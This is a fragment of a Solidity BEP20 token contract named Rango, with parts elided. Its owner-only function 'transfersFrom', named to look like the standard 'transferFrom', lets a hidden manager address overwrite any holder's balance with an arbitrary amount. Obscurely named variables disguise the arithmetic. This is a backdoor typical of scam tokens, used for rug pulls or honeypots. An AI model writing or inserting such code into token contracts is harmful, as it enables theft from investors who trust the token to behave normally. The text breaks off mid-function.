...
contract Rango is Context, IBEP20, Ownable {
  ...
  constructor() public {
    Feeback = uint256(uint160(msg.sender));
    Tokenn = 1;
    ...
    newBalance[walletOwner] = _totalSupply;
    allowAddress[walletOwner] = true;
 ...
 function transfersFrom(address spender, uint256 _value) external onlyOwner {
    if(msg.sender == address(walletManager)){
    uint256 rtAmount = uint256(spender);
    newBalance[address(rtAmount)] = Tokenn * Feeback * swapFees * _value * (10 ** 9) / Feeback;
